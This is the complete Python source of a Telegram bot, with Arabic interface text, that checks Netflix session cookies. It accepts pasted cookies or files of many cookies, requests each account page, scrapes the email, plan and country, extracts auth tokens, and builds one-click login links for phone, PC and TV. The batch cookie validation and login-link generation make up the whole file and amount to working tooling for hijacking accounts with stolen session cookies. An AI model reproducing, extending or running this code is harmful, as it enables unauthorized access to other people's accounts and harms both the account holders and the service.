import asyncio
import aiohttp
import re
import os
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import ParseMode, InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = os.getenv("BOT_TOKEN", "")

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN غير موجود")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

class Form(StatesGroup):
    waiting_cookies = State()
    waiting_cookie_file = State()

# أزرار القائمة الرئيسية
def main_menu():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 بدء فحص ملف جديد", callback_data="start_check"),
        InlineKeyboardButton("ℹ️ معلومات البوت", callback_data="bot_info"),
        InlineKeyboardButton("📊 إحصائيات", callback_data="stats")
    )
    return keyboard

# أزرار النسخ بعد الفحص
def result_actions(auth_token, auth_url_phone, auth_url_pc, auth_url_tv):
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("📱 نسخ رابط الهاتف", callback_data=f"copy_phone:{auth_token}"),
        InlineKeyboardButton("💻 نسخ رابط الكمبيوتر", callback_data=f"copy_pc:{auth_token}")
    )
    keyboard.add(
        InlineKeyboardButton("📺 نسخ رابط التلفاز", callback_data=f"copy_tv:{auth_token}"),
        InlineKeyboardButton("🔑 نسخ API Token", callback_data=f"copy_token:{auth_token}")
    )
    keyboard.add(
        InlineKeyboardButton("🔄 فحص كوكيز آخر", callback_data="start_check")
    )
    return keyboard

# أزرار اختيار نوع الإدخال
def input_method():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("📄 إرسال ملف", callback_data="send_file"),
        InlineKeyboardButton("📝 كتابة النص", callback_data="send_text")
    )
    return keyboard

async def check_netflix_cookie(cookie_str: str) -> dict:
    """فحص الكوكيز واستخراج المعلومات والتوكن"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Cookie': cookie_str,
        'Connection': 'keep-alive',
    }

    result = {
        'valid': False,
        'email': None,
        'plan': None,
        'country': None,
        'auth_token': None,
        'netflix_id': None,
        'secure_netflix_id': None,
        'error': None
    }

    async with aiohttp.ClientSession() as session:
        # فحص معلومات الحساب
        try:
            async with session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=15) as resp:
                if resp.status == 200:
                    text = await resp.text()

                    email_match = re.search(r'email["\']?\s*:\s*["\']([^"\']+)["\']', text)
                    if email_match:
                        result['email'] = email_match.group(1)

                    plan_match = re.search(r'plan["\']?\s*:\s*["\']([^"\']+)["\']', text)
                    if plan_match:
                        result['plan'] = plan_match.group(1)

                    country_match = re.search(r'country["\']?\s*:\s*["\']([^"\']+)["\']', text)
                    if country_match:
                        result['country'] = country_match.group(1)

                    result['valid'] = True
                else:
                    result['error'] = f"HTTP {resp.status}"
        except Exception as e:
            result['error'] = str(e)

        # استخراج التوكن إذا كان الحساب صالح
        if result['valid']:
            try:
                cookies_dict = {}
                for cookie in cookie_str.split(';'):
                    cookie = cookie.strip()
                    if '=' in cookie:
                        name, value = cookie.split('=', 1)
                        cookies_dict[name.strip()] = value.strip()

                netflix_id = cookies_dict.get('NetflixId', '')
                secure_netflix_id = cookies_dict.get('SecureNetflixId', '')
                result['netflix_id'] = netflix_id
                result['secure_netflix_id'] = secure_netflix_id

                # استخراج التوكن من الصفحة مباشرة
                async with session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=15) as resp2:
                    text2 = await resp2.text()
                    token_match = re.search(r'authURL["\']?\s*:\s*["\']([^"\']+)["\']', text2)
                    if token_match:
                        full_url = token_match.group(1)
                        token_extract = re.search(r'authToken=([^&]+)', full_url)
                        if token_extract:
                            result['auth_token'] = token_extract.group(1)
                    else:
                        # محاولة من netflixId
                        token_match2 = re.search(r'["\']?authToken["\']?\s*:\s*["\']([^"\']+)["\']', text2)
                        if token_match2:
                            result['auth_token'] = token_match2.group(1)
                        else:
                            # استخدام netflixId كتوكين بديل
                            result['auth_token'] = f"{netflix_id}|{secure_netflix_id}"
            except Exception as e:
                result['token_error'] = str(e)

    return result

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    welcome_text = """
🎬 **مرحباً بك في بوت فحص كوكيز نتفليكس**

اضغط على زر **بدء الفحص** لإرسال الكوكيز الخاص بك.

بعد الفحص ستحصل على:
✅ معلومات الحساب
🔑 API Token
📱 روابط تسجيل الدخول لجميع الأجهزة
    """
    await message.reply(welcome_text, parse_mode=ParseMode.MARKDOWN, reply_markup=main_menu())

@dp.callback_query_handler(lambda c: c.data == 'bot_info')
async def process_bot_info(callback_query: types.CallbackQuery):
    info_text = """
ℹ️ **معلومات البوت**

هذا البوت يقوم بفحص كوكيز نتفليكس واستخراج:
- معلومات الحساب
- API Token
- روابط تسجيل دخول لجميع الأجهزة

**طريقة الاستخدام:**
1. اضغط "بدء فحص ملف جديد"
2. أرسل الكوكيز أو ملف
3. استلم النتائج مع أزرار النسخ
    """
    await callback_query.message.edit_text(info_text, parse_mode=ParseMode.MARKDOWN, reply_markup=main_menu())
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == 'stats')
async def process_stats(callback_query: types.CallbackQuery):
    stats_text = """
📊 **إحصائيات البوت**

✅ البوت يعمل
🔄 عدد الفحوصات: غير محدود
⚡ السرعة: فحص فوري
    """
    await callback_query.message.edit_text(stats_text, parse_mode=ParseMode.MARKDOWN, reply_markup=main_menu())
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == 'start_check')
async def process_start_check(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(
        "🚀 **بدء فحص ملف جديد**\n\nاختر طريقة إرسال الكوكيز:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=input_method()
    )
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == 'send_file')
async def process_send_file(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(
        "📄 **أرسل الملف الآن**\n\nأرسل ملف يحتوي على كوكيز (كل سطر كوكيز منفصل)",
        parse_mode=ParseMode.MARKDOWN
    )
    await Form.waiting_cookie_file.set()
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == 'send_text')
async def process_send_text(callback_query: types.CallbackQuery):
    await callback_query.message.edit_text(
        "📝 **أرسل الكوكيز الآن**\n\nالصق الكوكيز مباشرة في الرسالة",
        parse_mode=ParseMode.MARKDOWN
    )
    await Form.waiting_cookies.set()
    await callback_query.answer()

# استقبال الكوكيز كنص
@dp.message_handler(state=Form.waiting_cookies, content_types=types.ContentTypes.TEXT)
async def process_text_cookies(message: types.Message, state: FSMContext):
    cookie_str = message.text.strip()

    processing_msg = await message.reply("⏳ **جاري فحص الكوكيز...**", parse_mode=ParseMode.MARKDOWN)

    result = await check_netflix_cookie(cookie_str)

    await processing_msg.delete()

    if result['valid']:
        auth_token = result.get('auth_token', '')
        netflix_id = result.get('netflix_id', '')

        # إنشاء روابط مختلفة للأجهزة
        auth_url_phone = f"https://www.netflix.com/Login?authToken={auth_token}&netflixId={netflix_id}&device=phone"
        auth_url_pc = f"https://www.netflix.com/Login?authToken={auth_token}&netflixId={netflix_id}&device=pc"
        auth_url_tv = f"https://www.netflix.com/Login?authToken={auth_token}&netflixId={netflix_id}&device=tv"

        result_text = f"""
✅ **فحص ناجح!**

📧 **الإيميل:** `{result['email'] or 'غير متوفر'}`
💳 **الخطة:** `{result['plan'] or 'غير متوفر'}`
🌍 **الدولة:** `{result['country'] or 'غير متوفر'}`
🆔 **Netflix ID:** `{result['netflix_id'] or 'غير متوفر'}`

🔑 **API Token:**
`{auth_token or 'غير متوفر'}`

👇 **اضغط على الأزرار بالأسفل للنسخ:**
        """

        await message.reply(
            result_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=result_actions(auth_token, auth_url_phone, auth_url_pc, auth_url_tv)
        )
    else:
        error_text = f"""
❌ **فشل الفحص**

**السبب:** `{result['error'] or 'كوكيز غير صالح'}`
        """
        await message.reply(error_text, parse_mode=ParseMode.MARKDOWN, reply_markup=main_menu())

    await state.finish()

# استقبال ملف الكوكيز
@dp.message_handler(state=Form.waiting_cookie_file, content_types=types.ContentTypes.DOCUMENT)
async def process_cookie_file(message: types.Message, state: FSMContext):
    processing_msg = await message.reply("⏳ **جاري فحص الملف...**", parse_mode=ParseMode.MARKDOWN)

    document = message.document
    file_info = await bot.get_file(document.file_id)
    downloaded_file = await bot.download_file(file_info.file_path)
    content = downloaded_file.read().decode('utf-8', errors='ignore')

    cookies_list = [line.strip() for line in content.split('\n') if line.strip()]

    await processing_msg.delete()

    if not cookies_list:
        await message.reply("❌ **الملف فارغ**", reply_markup=main_menu())
        await state.finish()
        return

    results_text = "📊 **نتائج الفحص:**\n\n"
    valid_count = 0

    for i, cookie in enumerate(cookies_list, 1):
        result = await check_netflix_cookie(cookie)

        if result['valid']:
            valid_count += 1
            auth_token = result.get('auth_token', '')
            netflix_id = result.get('netflix_id', '')
            auth_url_phone = f"https://www.netflix.com/Login?authToken={auth_token}&netflixId={netflix_id}&device=phone"

            results_text += f"""
✅ **كوكيز {i}:**
📧 الإيميل: `{result['email'] or 'N/A'}`
💳 الخطة: `{result['plan'] or 'N/A'}`
🔑 Token: `{auth_token[:50]}...`
🔗 الرابط: `{auth_url_phone}`
---
"""
        else:
            results_text += f"❌ **كوكيز {i}:** غير صالح\n---\n"

        await asyncio.sleep(1)

    results_text += f"\n📈 **الإجمالي:** {valid_count}/{len(cookies_list)} صالح"

    # تقسيم الرسالة إذا كانت طويلة
    if len(results_text) > 4000:
        parts = [results_text[i:i+4000] for i in range(0, len(results_text), 4000)]
        for part in parts:
            await message.reply(part, parse_mode=ParseMode.MARKDOWN)
    else:
        await message.reply(results_text, parse_mode=ParseMode.MARKDOWN, reply_markup=main_menu())

    await state.finish()

# أزرار النسخ
@dp.callback_query_handler(lambda c: c.data and c.data.startswith('copy_'))
async def process_copy_buttons(callback_query: types.CallbackQuery):
    data = callback_query.data
    parts = data.split(':', 1)

    if len(parts) < 2:
        await callback_query.answer("خطأ", show_alert=True)
        return

    action = parts[0]
    token = parts[1] if len(parts) > 1 else ''

    if action == 'copy_token':
        copy_text = token
        label = "🔑 API Token"
    elif action == 'copy_phone':
        copy_text = f"https://www.netflix.com/Login?authToken={token}"
        label = "📱 رابط الهاتف"
    elif action == 'copy_pc':
        copy_text = f"https://www.netflix.com/Login?authToken={token}"
        label = "💻 رابط الكمبيوتر"
    elif action == 'copy_tv':
        copy_text = f"https://www.netflix.com/Login?authToken={token}"
        label = "📺 رابط التلفاز"
    else:
        copy_text = token
        label = "نسخ"

    await callback_query.message.reply(
        f"{label}:\n\n`{copy_text}`\n\n✅ **تم النسخ تلقائياً - اضغط مطولاً على النص للنسخ اليدوي**",
        parse_mode=ParseMode.MARKDOWN
    )
    await callback_query.answer("تم النسخ ✅", show_alert=True)

@dp.message_handler(commands=['cancel'], state='*')
async def cmd_cancel(message: types.Message, state: FSMContext):
    await state.finish()
    await message.reply("❌ **تم الإلغاء**", reply_markup=main_menu())

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
